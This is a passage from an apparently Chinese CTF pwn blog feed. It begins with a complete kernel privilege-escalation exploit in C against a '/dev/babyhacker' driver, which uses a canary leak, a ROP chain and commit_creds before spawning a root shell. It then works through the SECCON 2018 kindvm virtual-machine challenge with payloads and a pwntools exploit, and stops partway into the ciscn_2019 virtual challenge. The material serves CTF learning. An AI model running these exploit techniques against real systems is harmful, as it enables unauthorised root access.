class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line">typedef int __attribute__((regparm(<span class="number">3</span>))) (*_commit_creds)(unsigned long cred);</span><br><span class="line">typedef unsigned long __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(unsigned long cred);</span><br><span class="line">_commit_creds commit_creds =<span class="number">0xffffffff810a1430</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred =<span class="number">0xffffffff810a1820</span>;</span><br><span class="line">void spawn_shell()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!getuid())</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">puts(<span class="string">"[*]spawn shell error!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* size_t commit_creds = <span class="number">0xffffffff810a1430</span>; */</span><br><span class="line">/* size_t prepare_kernel_cred = <span class="number">0xffffffff810a1820</span>; */</span><br><span class="line">size_t raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line">void save_status()</span><br><span class="line">&#123;</span><br><span class="line">__asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line"><span class="string">"mov user_ss, ss;"</span></span><br><span class="line"><span class="string">"mov user_sp,rsp;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"pop user_rflags;"</span></span><br><span class="line">   );</span><br><span class="line">puts(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_buffersize(int fd, int idx)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"[*]set buffersize to %d\n"</span>,idx);</span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void baby_read(int fd, char *buf)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"[*]read to buf.\n"</span>);</span><br><span class="line">ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line">printf(<span class="string">"[+]read to buf success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void baby_write(int fd, char *buf)</span><br><span class="line">&#123;</span><br><span class="line">printf(<span class="string">"[*]copy from user.\n"</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x30001</span>, buf);</span><br><span class="line">printf(<span class="string">"[+]copy from user success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void get_root()</span><br><span class="line">&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">save_status();</span><br><span class="line">int fd = open(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">puts(<span class="string">"[*]open /dev/babyhacker error!"</span>);</span><br><span class="line">exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_buffersize(fd, <span class="number">0x80000200</span>);</span><br><span class="line"></span><br><span class="line">char buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">baby_read(fd, buf);</span><br><span class="line">size_t offset = ((size_t *)buf)[<span class="number">8</span>] - <span class="number">0xc2d84</span> - raw_vmlinux_base;</span><br><span class="line">printf(<span class="string">"[+]offset: %p\n"</span>, offset);</span><br><span class="line">size_t canary = ((size_t *)buf)[<span class="number">40</span>];</span><br><span class="line">printf(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line">commit_creds += offset;</span><br><span class="line">printf(<span class="string">"[+]commit_creds: %p\n"</span>, commit_creds);</span><br><span class="line">prepare_kernel_cred += offset;</span><br><span class="line">printf(<span class="string">"[+]prepare_kernel_cred: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line"></span><br><span class="line">size_t rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff8109054d</span> + offset; // pop rdi; ret </span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81004d70</span> + offset; //mov_rc4_pop_ret</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (size_t)get_root;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff810636b4</span> + offset; // swapgs; popfq; ret</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81478294</span> + offset; // iretq; ret; </span><br><span class="line">rop[i++] = (size_t)spawn_shell;         // rip </span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line">baby_write(fd, rop);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/04/16/kernel-pwn-one/3.png" class="lazyload"></p>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> gxzy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>虚拟指令集pwn</title>
      <link href="/2020/04/10/%E8%99%9A%E6%8B%9F%E6%8C%87%E4%BB%A4%E9%9B%86pwn/"/>
      <url>/2020/04/10/%E8%99%9A%E6%8B%9F%E6%8C%87%E4%BB%A4%E9%9B%86pwn/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>近来很多比赛都有虚拟指令集pwn的题目，漏洞都是常规的漏洞，但是题目还算新颖，有一种计组做实验的感觉。</p><p>这类题目主要就是搞清楚指令集的作用，需要对字节、符号、移位等知识有非常清晰的认识，废话不多说，先来一道题目试试。</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p>来源：<a href="https://github.com/SECCON/SECCON2018_online_CTF/tree/master/Pwn/kindvm" target="_blank" rel="noopener">seccon-2018-kindvm</a></p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/kindvm/kindvm&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>静态分析，程序流程如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ctf_setup();       <span class="comment">//初始化设置</span></span><br><span class="line">  kindvm_setup();    <span class="comment">//设置虚拟指令集</span></span><br><span class="line">  input_insn();      <span class="comment">//输入指令</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))(kc + <span class="number">16</span>))();   <span class="comment">//执行某个函数</span></span><br><span class="line">  <span class="keyword">while</span> ( !*(_DWORD *)(kc + <span class="number">4</span>) )     <span class="comment">//当kc+4为true时终止执行</span></span><br><span class="line">    exec_insn();     <span class="comment">//执行指令</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">void</span>))(kc + <span class="number">20</span>))();   <span class="comment">//执行某个函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注kindvm_setup()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kindvm_setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>u);</span><br><span class="line">  kc = (<span class="keyword">int</span>)v0;</span><br><span class="line">  *v0 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(kc + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  v1 = kc;</span><br><span class="line">  *(_DWORD *)(v1 + <span class="number">8</span>) = input_username(); <span class="comment">//输入name,溢出会执行hint1()</span></span><br><span class="line">  *(_DWORD *)(kc + <span class="number">12</span>) = <span class="string">"banner.txt"</span>;</span><br><span class="line">  *(_DWORD *)(kc + <span class="number">16</span>) = func_greeting;  <span class="comment">//执行指令前的函数</span></span><br><span class="line">  *(_DWORD *)(kc + <span class="number">20</span>) = func_farewell;  <span class="comment">//执行指令后的函数</span></span><br><span class="line">  mem = <span class="built_in">malloc</span>(<span class="number">0x400</span>u);     <span class="comment">//内存在堆上</span></span><br><span class="line">  <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  reg = <span class="built_in">malloc</span>(<span class="number">0x20</span>u);      <span class="comment">//寄存器也在堆上</span></span><br><span class="line">  <span class="built_in">memset</span>(reg, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  insn = <span class="built_in">malloc</span>(<span class="number">0x400</span>u);    <span class="comment">//存放指令也在堆上</span></span><br><span class="line">  result = <span class="built_in">memset</span>(mem, <span class="string">'A'</span>, <span class="number">0x400</span>u);</span><br><span class="line">  func_table[<span class="number">0</span>] = (<span class="keyword">int</span>)insn_nop;</span><br><span class="line">  dword_804B0C4 = (<span class="keyword">int</span>)insn_load;  <span class="comment">//0x01 + 寄存器号（0-7）+ 内存地址（2字节，小于0x3fc）</span></span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)insn_store; <span class="comment">//0x02 + 内存地址（2字节，小于0x3fc) + 寄存器号（0-7）</span></span><br><span class="line">  dword_804B0CC = (<span class="keyword">int</span>)insn_mov;   <span class="comment">//0x03 + 寄存器号a + 寄存器号b ;a = b</span></span><br><span class="line">  dword_804B0D0 = (<span class="keyword">int</span>)insn_add;   <span class="comment">//0x04 + 寄存器号a + 寄存器号b a+=b a如果小于0，那么执行hint3()</span></span><br><span class="line">  dword_804B0D4 = (<span class="keyword">int</span>)insn_sub;   <span class="comment">//0x05 + 寄存器号a + 寄存器号b a-=b</span></span><br><span class="line">  dword_804B0D8 = (<span class="keyword">int</span>)insn_halt;  <span class="comment">//0x06 设置kc+4 = 1   终止执行</span></span><br><span class="line">  dword_804B0DC = (<span class="keyword">int</span>)insn_in;    <span class="comment">//0x07 + 寄存器号 + 立即数（32位 4字节）将立即数存入寄存器</span></span><br><span class="line">  dword_804B0E0 = (<span class="keyword">int</span>)insn_out;   <span class="comment">//0x08 + 寄存器号 打印寄存器的值</span></span><br><span class="line">  dword_804B0E4 = (<span class="keyword">int</span>)insn_hint;  <span class="comment">//0x09 执行hint2()</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们来看一下hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input your name : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"> _   _ _       _   _    ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_/ |  / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| | | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_| | | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|_|  \____|_____| |_|   (_)</span><br><span class="line">                                             </span><br><span class="line"></span><br><span class="line">Nice try! The theme of this binary is not Stack-Based BOF!</span><br><span class="line">However, your name is not meaningless...</span><br></pre></td></tr></table></figure><p>hint1：name溢出即可，提示name有作用，但不是溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm socat tcp-l:9999,fork exec:./kindvm</span><br><span class="line"></span><br><span class="line">➜  kindvm echo -e &apos;kangel\n\x09&apos; |nc 127.0.0.1 9999                          </span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line"> _   _ _       _   ____     ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_|___ \   / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| __) | | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_ / __/  | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|_____|  \____|_____| |_|   (_)</span><br><span class="line">                                                 </span><br><span class="line">Nice try! You can analyze vm instruction and execute it!</span><br><span class="line">Flag file name is &quot;flag.txt&quot;.</span><br></pre></td></tr></table></figure><p>hint2：输入’\x09’，提示filename为”flag.txt”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_<span class="function">DWORD *<span class="title">insn_add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v1; <span class="comment">// [esp+Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="keyword">load_insn_uint8_t</span>();   <span class="comment">//寄存器a</span></span><br><span class="line">  v2 = <span class="keyword">load_insn_uint8_t</span>();   <span class="comment">//寄存器b</span></span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">7u</span> )</span><br><span class="line">    kindvm_abort();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">7u</span> )</span><br><span class="line">    kindvm_abort();</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)reg + v1) &gt;= <span class="number">0</span> )   </span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  result = (<span class="keyword">char</span> *)reg + <span class="number">4</span> * v1;</span><br><span class="line">  *result += *((_DWORD *)reg + v2);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (_DWORD *)*((_DWORD *)reg + v1);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt; <span class="number">0</span> )    <span class="comment">//寄存器a为负数</span></span><br><span class="line">      hint3();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以先往reg[0]中写入负数，然后 add reg[0], reg[0] </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm echo -e &apos;kangel\n\x07\x00\xff\xff\xff\xff\x04\x00\x00&apos; |nc 127.0.0.1 9999</span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line"> _   _ _       _   _____    ____ _____ _____   _ </span><br><span class="line">| | | (_)_ __ | |_|___ /   / ___| ____|_   _| | |</span><br><span class="line">| |_| | | &apos;_ \| __| |_ \  | |  _|  _|   | |   | |</span><br><span class="line">|  _  | | | | | |_ ___) | | |_| | |___  | |   |_|</span><br><span class="line">|_| |_|_|_| |_|\__|____/   \____|_____| |_|   (_)</span><br><span class="line">                                                 </span><br><span class="line">Nice try! You can cause Integer Overflow!</span><br><span class="line">The value became minus value. Minus value is important.</span><br></pre></td></tr></table></figure><p>hint3：提示有整数溢出</p><p>我们现在来看一下指令退出后的函数func_farewell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> func_farewell()</span><br><span class="line">&#123;</span><br><span class="line">  open_read_write(*(<span class="keyword">char</span> **)(kc + <span class="number">12</span>));   <span class="comment">//banner.txt</span></span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"Execution is end! Thank you!\n"</span>, <span class="number">0x1D</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>banner.txt和name的地址都存放在堆上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20wx kc - 8</span><br><span class="line">0x804c000:      0x00000000      0x00000021      0x00000000      0x00000000</span><br><span class="line">0x804c010:      0x0804c028      0x080491b2      0x08048f89      0x08048fba</span><br><span class="line">0x804c020:      0x00000000      0x00000011      0x67616c66      0x7478742e</span><br><span class="line">0x804c030:      0x00000000      0x00000409      0x41414141      0x41414141</span><br><span class="line">0x804c040:      0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">pwndbg&gt; x/s 0x0804c028</span><br><span class="line">0x804c028:      &quot;flag.txt&quot;</span><br><span class="line">pwndbg&gt; x/s 0x080491b2</span><br><span class="line">0x80491b2:      &quot;banner.txt&quot;</span><br><span class="line">pwndbg&gt; p/x mem</span><br><span class="line">$3 = 0x804c038</span><br></pre></td></tr></table></figure><p>因此 read <code>name</code> -&gt; write it to <code>banner.txt</code>.即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  kindvm echo -e &apos;flag.txt\n\x01\x07\xff\xd8\x02\xff\xdc\x07\x06&apos; | nc 127.0.0.1 9999                                                  </span><br><span class="line">Input your name : Input instruction :  _    _           _                 </span><br><span class="line">| | _(_)_ __   __| |_   ___ __ ___  </span><br><span class="line">| |/ / | &apos;_ \ / _` \ \ / / &apos;_ ` _ \ </span><br><span class="line">|   &lt;| | | | | (_| |\ V /| | | | | |</span><br><span class="line">|_|\_\_|_| |_|\__,_| \_/ |_| |_| |_|</span><br><span class="line">                                    </span><br><span class="line">Instruction start!</span><br><span class="line">SECCON&#123;s7ead1ly_5tep_by_5tep&#125;</span><br><span class="line">Execution is end! Thank you!</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">'./kindvm'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name : "</span>)</span><br><span class="line">p.sendline(<span class="string">'flag.txt'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input instruction : "</span>) </span><br><span class="line">payload=<span class="string">"\x01\x03\xff\xd8"</span> <span class="comment">#load 03,[0xffd8]  reg3&lt;=*(mem-40) 0xffd8 = -40</span></span><br><span class="line">payload+=<span class="string">"\x02\xff\xdc\x03"</span> <span class="comment">#store [0xffdc],03 *(mem-36)&lt;=reg3  0xffdc = -36</span></span><br><span class="line">payload+=<span class="string">"\x06"</span>                <span class="comment">#halt</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><p>来源：<a href="https://github.com/Dittozzz/ctf-pwn-writeup/tree/master/ciscn-2019/Virtual" target="_blank" rel="noopener">ciscn_2019_初赛_virtual</a></p><p>checksec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/mnt/hgfs/shared/vmpwn/ciscn_2019_c_virtual/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>这道题相对上一道题复杂了许多，首先弄清楚程序逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *exec_name; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  section_info *stack_addr; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  section_info *text_addr; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> **data_addr; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  do_init();</span><br><span class="line">  exec_name = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);  <span class="comment">//name存放在堆上</span></span><br><span class="line">  stack_addr = sub_4013B4(<span class="number">64</span>);          <span class="comment">//模拟栈，存放栈数据</span></span><br><span class="line">  text_addr = sub_4013B4(<span class="number">128</span>);          <span class="comment">//模拟代码段，存放指令</span></span><br><span class="line">  data_addr = (<span class="keyword">void</span> **)sub_4013B4(<span class="number">64</span>);  <span class="comment">//模拟数据段，存放数据</span></span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span 